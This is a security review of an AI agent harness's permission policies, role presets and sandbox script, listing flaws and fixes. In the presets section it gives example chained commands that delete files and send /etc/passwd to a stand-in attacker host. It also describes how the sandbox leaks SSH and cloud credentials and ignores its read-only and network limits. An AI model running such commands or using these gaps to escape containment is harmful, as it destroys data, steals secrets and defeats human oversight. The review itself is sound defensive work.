# Independent Validation Report: Permissions & Sandbox

This validation evaluates the policy definitions, role presets, and sandbox gate script located in [`.harness/`](file:///mnt/c/Users/Shashank%20Karamudi/Desktop/solo-levelling/the%20harness/.harness).

---

## 1. [`policies.cedar`](file:///mnt/c/Users/Shashank%20Karamudi/Desktop/solo-levelling/the%20harness/.harness/permissions/policies.cedar)

### **VERDICT: REJECTED (Syntactically Invalid & Semantically Broken)**

The Cedar policy file contains multiple syntax errors that prevent compilation with standard Cedar parsers, and a fatal logical flaw that makes human-approved actions impossible to execute.

```
   ┌──────────────────────────────────────────────────────────────────────────┐
   │ policies.cedar Authorization Flow Failure                                │
   │                                                                          │
   │  Principal: Role::"DevOps"                                               │
   │  Action: Action::"git_push_main"                                         │
   │  Context: { has_human_approval: true, approval_token_valid: true }       │
   │                                                                          │
   │   Policy 3 (Forbid ... unless): Evaluates to FALSE (Not forbidden)       │
   │   Policy 1 & 2 (Permit): No matching permit for "git_push_main"          │
   │                                                                          │
   │   ──► Cedar Engine (Default-Deny) ──► Final Decision: DENY ❌            │
   └──────────────────────────────────────────────────────────────────────────┘
```

### Concrete Issues

1. **Syntax Error: List Literal in Principal Scope (Line 18)**
   * **Code:** `principal in [Role::"Coder", Role::"DevOps", Role::"Planner"]`
   * **Flaw:** Cedar grammar for `PrincipalScope` allows only a single entity (`principal == Entity`), single entity hierarchy (`principal in Entity`), or type match (`principal is Type`). List/set literals `[...]` are strictly illegal in `PrincipalScope` and `ResourceScope` (they are only supported in `ActionScope`).
   * **Fix:** Use a condition clause or group entity:
     ```cedar
     permit(
         principal,
         action in [Action::"write_to_file", Action::"replace_file_content", Action::"run_test", Action::"create_branch"],
         resource in Directory::"workspace"
     ) when {
         [Role::"Coder", Role::"DevOps", Role::"Planner"].contains(principal)
     };
     ```

2. **Syntax Error: Method Call on String Pattern (Lines 49–52)**
   * **Code:** `resource.path.like("/etc/*")`
   * **Flaw:** Cedar does not support method syntax `.like(...)` on strings. Cedar uses the binary `like` keyword.
   * **Fix:** Change to `resource.path like "/etc/*"`.

3. **Fatal Semantic Flaw: Deadlock on HITL / Class 3 Actions (Lines 29–41)**
   * **Code:** `forbid(...) unless { context.has_human_approval == true && context.approval_token_valid == true };`
   * **Flaw:** Cedar is a **default-deny** language. For an authorization request to succeed, at least one `permit` policy must evaluate to true, and zero `forbid` policies must evaluate to true. When human approval is supplied, the `forbid` rule deactivates, but there is **no corresponding `permit` policy** for `git_push_main`, `drop_database`, `terraform_apply_production`, or `publish_package`. 
   * **Result:** All Class 3 actions are permanently denied, even with valid approval tokens.

4. **Security Bypass: Path Expansion Mismatch (Lines 51–52)**
   * **Code:** `resource.path like "~/.ssh/*"`
   * **Flaw:** Cedar string matching performs no tilde or variable expansion. Tool calls passing absolute paths (e.g. `/home/user/.ssh/id_rsa`) will bypass this filter completely.

---

## 2. [`presets.json`](file:///mnt/c/Users/Shashank%20Karamudi/Desktop/solo-levelling/the%20harness/.harness/permissions/presets.json)

### **VERDICT: CONDITIONALLY VALID (Valid JSON, Archetype-Complete, Security Flaws in Rule Model)**

The file is well-formed JSON and covers all 6 canonical archetypes (`C1_ProductEngineering` through `C6_Modernization_Migration`). However, it contains operational gaps and rule-matching vulnerabilities.

| Archetype | JSON Parsed | C1–C6 Scope | Primary Functional / Security Gap |
| :--- | :---: | :---: | :--- |
| **C1** Product Engineering | ✅ | ✅ | Prefix-wildcard command injection vulnerability |
| **C2** Data & MLOps | ✅ | ✅ | Flawed heuristic blocking on `postgres_readonly` tool |
| **C3** Browser Automation | ✅ | ✅ | **Missing `filesystem:read*`** (cannot read fixtures/configs) |
| **C4** Knowledge Synthesis | ✅ | ✅ | Empty `hitl_escalation_triggers` (zero escalation controls) |
| **C5** Platform & Infra | ✅ | ✅ | **Missing `filesystem:read*`** (cannot inspect manifests/state) |
| **C6** Modernization | ✅ | ✅ | Missing core git inspection tools (`git:status`, `git:diff`) |

### Concrete Issues

1. **Command Injection via Prefix Wildcards (Lines 11–13, 98–99)**
   * **Code:** `"run_command:npm test*"`
   * **Flaw:** Prefix matching on raw command strings without shell tokenizer separation allows arbitrary command chaining (e.g., `npm test; rm -rf /` or `pytest && curl https://attacker.com/leak?d=$(cat /etc/passwd)`). Both match the `"npm test*"` and `"pytest*"` prefix.
   * **Fix:** Enforce structured execution arrays (`["npm", "test"]`) rather than unparsed shell glob strings.

2. **Self-Defeating Capability Denials (Lines 46–50, 76–81)**
   * **Flaw:** `C3_Browser_Automation` and `C5_Platform_Infra` grant write tools (`filesystem:write:./tests/e2e/*`, `filesystem:write:./terraform/*`) but omit `filesystem:read*`. Under an explicit allowlist model, agents cannot read schemas, test configs, or existing Terraform files to modify them.

3. **Inconsistent Deny vs. Allow Model (Lines 15–19)**
   * **Flaw:** In `C1`, `allowed_tools` explicitly lists only `pytest*`, `npm test*`, and `cargo test*`. Listing `"run_command:sudo*"` in `denied_tools` implies unlisted commands might be executed unless explicitly blacklisted. If the evaluation engine relies on `denied_tools` for enforcement, it is fail-open.

---

## 3. [`sandbox/gate.sh`](file:///mnt/c/Users/Shashank%20Karamudi/Desktop/solo-levelling/the%20harness/.harness/sandbox/gate.sh)

### **VERDICT: REJECTED (Critical Security Vulnerabilities & Host Write Escalation)**

[`sandbox/gate.sh`](file:///mnt/c/Users/Shashank%20Karamudi/Desktop/solo-levelling/the%20harness/.harness/sandbox/gate.sh) implements namespace (`bwrap`) and container (`docker`/`podman`) containment, but contains critical flaws that violate read-only guarantees and expose host credentials.

```
   ┌──────────────────────────────────────────────────────────────────────────┐
   │ Docker Isolation Bypass: --ro Flag Ignored                               │
   │                                                                          │
   │  Caller: ./gate.sh --ro -- pytest                                        │
   │  Parsed: READ_ONLY_WORKSPACE=1                                           │
   │                                                                          │
   │  Docker Branch (Line 187):                                               │
   │  CONTAINER_FLAGS+=( -v "$RESOLVED_WORKSPACE:$RESOLVED_WORKSPACE:rw" )     │
   │                                                          ▲               │
   │                                                          └── HARDCODED!  │
   │                                                                          │
   │  ──► Result: Container has READ-WRITE access to host workspace ❌        │
   └──────────────────────────────────────────────────────────────────────────┘
```

### Concrete Issues

1. **CRITICAL: Read-Only Flag (`--ro`) Ignored in Docker Backend (Line 187)**
   * **Code:**
     ```bash
     -v "$RESOLVED_WORKSPACE:$RESOLVED_WORKSPACE:rw"
     ```
   * **Flaw:** When executing with Docker/Podman, the script hardcodes `:rw`. Specifying `--ro` sets `READ_ONLY_WORKSPACE=1`, but Docker never evaluates this variable.
   * **Impact:** Any command executed with `--ro` under Docker retains full write privileges on the host filesystem.
   * **Fix:**
     ```bash
     local MOUNT_OPTS="rw"
     [[ "$READ_ONLY_WORKSPACE" -eq 1 ]] && MOUNT_OPTS="ro"
     CONTAINER_FLAGS+=(-v "$RESOLVED_WORKSPACE:$RESOLVED_WORKSPACE:$MOUNT_OPTS")
     ```

2. **CRITICAL: Credential Masking Shadowed by Later Bind Mount in Bwrap (Lines 138–149)**
   * **Code:** Lines 138–142 mount empty `tmpfs` over `$HOME/.ssh`, `$HOME/.aws`, etc. Line 148 mounts `--bind "$RESOLVED_WORKSPACE" "$RESOLVED_WORKSPACE"`.
   * **Flaw:** `bwrap` evaluates mounts sequentially from left to right. If `WORKSPACE_DIR` defaults to `$HOME` or a parent path containing `.ssh`, the later `--bind` overmounts and cancels out the earlier `--tmpfs` masking.
   * **Impact:** Host SSH keys and cloud credentials become fully exposed in the sandbox.
   * **Fix:** Move credential tmpfs masking loops to execute **after** workspace and scratch mounts.

3. **Container Runtime Working Directory Mismatch (Lines 185–187)**
   * **Code:** `-w "$(pwd)"`
   * **Flaw:** Docker isolates the filesystem. Unless `pwd` is inside `$RESOLVED_WORKSPACE`, the working directory will not exist inside the container base image (`python:3.11-slim`), causing container launch failure. Additionally, `$RESOLVED_SCRATCH` is mounted in `bwrap` (line 152) but never mounted into Docker.

4. **Missing Container Hardening Flags in Docker (Lines 181–190)**
   * **Flaw:** Docker invocation lacks `--read-only` (read-only container rootfs), `--cap-drop=ALL`, and `--security-opt=no-new-privileges`.
   * **Impact:** Root-equivalent processes in the container can modify container system files or escalate privileges.

5. **Fail-Open Network Mode Validation (Lines 133, 192)**
   * **Code:** `if [[ "$NETWORK_MODE" == "none" ]]; then ...`
   * **Flaw:** Any typo or unhandled mode (e.g. `--network isolated`) fails the `== "none"` check and silently enables unrestricted host network access. Network mode should strictly whitelist `"none"` and `"allow"`, failing fast on any other input.

---

## Remediation Summary

| File | Status | Priority Actions Required |
| :--- | :---: | :--- |
| [`policies.cedar`](file:///mnt/c/Users/Shashank%20Karamudi/Desktop/solo-levelling/the%20harness/.harness/permissions/policies.cedar) | **REJECTED** | 1. Replace `principal in [...]` with condition clause.<br>2. Replace `.like(...)` with binary `like`.<br>3. Add explicit `permit` policy for approved Class 3 actions.<br>4. Strip `~` in path policies and resolve canonical paths. |
| [`presets.json`](file:///mnt/c/Users/Shashank%20Karamudi/Desktop/solo-levelling/the%20harness/.harness/permissions/presets.json) | **NEEDS FIX** | 1. Add `filesystem:read*` to `C3` and `C5`.<br>2. Replace CLI prefix glob matching with tokenized argument rules.<br>3. Define HITL escalation triggers for `C4`. |
| [`sandbox/gate.sh`](file:///mnt/c/Users/Shashank%20Karamudi/Desktop/solo-levelling/the%20harness/.harness/sandbox/gate.sh) | **REJECTED** | 1. Respect `READ_ONLY_WORKSPACE` in Docker volume mount (`:ro`).<br>2. Reorder `bwrap` flags so credential masking tmpfs occurs after workspace bind.<br>3. Mount scratch dir in Docker and add `--cap-drop=ALL --read-only`.<br>4. Validate network mode input strictly. |
